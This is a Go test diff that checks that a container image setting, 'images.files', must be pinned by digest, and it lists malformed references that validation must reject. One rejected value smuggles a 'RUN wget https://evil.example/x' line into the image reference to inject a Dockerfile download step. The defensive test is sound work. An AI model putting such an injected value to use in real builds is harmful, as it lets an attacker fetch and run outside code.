@@ -710,3 +710,42 @@ func TestTheUnsafeImageIsAPinnedDefaultAndSwitchesNothingOn(t *testing.T) {
 		}
 	}
 }
+
+// images.files names the files image the decode step builds on (agentry-cli
+// #559): the default is pinned by digest and resolved at use, and an
+// operator's value must be pinned by digest too, because the image is
+// pulled by digest only.
+func TestTheFilesImageIsPinnedByDigest(t *testing.T) {
+	if !PinnedByDigest(DefaultFilesImage) {
+		t.Fatalf("DefaultFilesImage %q is not pinned by digest", DefaultFilesImage)
+	}
+	p := Default()
+	if p.Images.Files != "" {
+		t.Fatalf("Default() writes images.files = %q; it is resolved at use", p.Images.Files)
+	}
+	if p.Images.FilesImage() != DefaultFilesImage {
+		t.Fatalf("FilesImage() = %q", p.Images.FilesImage())
+	}
+	p.Images.Files = "registry.example/files:1@sha256:" + strings.Repeat("a", 64)
+	if err := p.Validate(); err != nil {
+		t.Fatalf("a digest-pinned images.files was refused: %v", err)
+	}
+	if p.Images.FilesImage() != p.Images.Files {
+		t.Fatal("an operator's images.files was not used")
+	}
+	for _, ref := range []string{
+		"registry.example/files:1",
+		"registry.example/files@sha256:" + strings.Repeat("a", 63),
+		"registry.example/files@sha256:" + strings.Repeat("A", 64),
+		"registry.example/files@sha256:" + strings.Repeat("a", 64) + "@sha256:" + strings.Repeat("b", 64),
+		"@sha256:" + strings.Repeat("a", 64),
+		"registry.example/my files@sha256:" + strings.Repeat("a", 64),
+		"x\nRUN wget https://evil.example/x\nFROM a@sha256:" + strings.Repeat("a", 64),
+		"Registry.Example/files@sha256:" + strings.Repeat("a", 64),
+	} {
+		p.Images.Files = ref
+		if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "images.files") {
+			t.Errorf("images.files %q was accepted (err %v)", ref, err)
+		}
+	}
+}
